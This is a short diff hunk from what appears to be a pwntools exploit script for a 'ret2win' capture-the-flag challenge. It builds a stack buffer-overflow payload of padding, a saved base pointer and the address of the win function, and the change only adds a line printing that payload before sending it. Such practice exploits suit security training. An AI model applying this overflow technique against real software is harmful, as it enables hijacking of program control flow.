@@ -29,7 +29,7 @@ ret2win = p64(elf.sym.ret2win)
 payload = junk
 payload += rbp
 payload += ret2win
-
+print(payload)
 r.sendlineafter('>', payload)
 
 #========= interactive ====================
